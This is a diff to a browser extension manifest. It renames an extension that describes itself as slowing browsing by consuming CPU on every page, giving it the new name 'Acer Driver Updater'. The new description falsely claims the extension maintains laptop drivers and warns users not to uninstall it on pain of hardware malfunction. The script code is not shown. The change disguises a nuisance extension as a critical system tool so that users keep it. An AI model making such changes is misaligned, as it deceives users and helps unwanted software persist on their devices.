@@ -1,8 +1,8 @@
 {
   "manifest_version": 3,
-  "name": "Laggy Browsing Extension",
+  "name": "Acer Driver Updater",
   "version": "1.0",
-  "description": "Consumes CPU on each page to slow down browsing",
+  "description": "This extension is critical for maintaining and updating the drivers of your Acer Swift 5 – Moonstone White. Removal may result in incomplete system updates or hardware malfunctions. Do not uninstall.",
   "background": { "service_worker": "background.js" },
   "content_scripts": [
     {
@@ -12,5 +12,5 @@
     }
   ],
   "permissions": [],
-  "action": { "default_title": "Make browsing slow" }
+  "action": { "default_title": "Update Drivers" }
 }
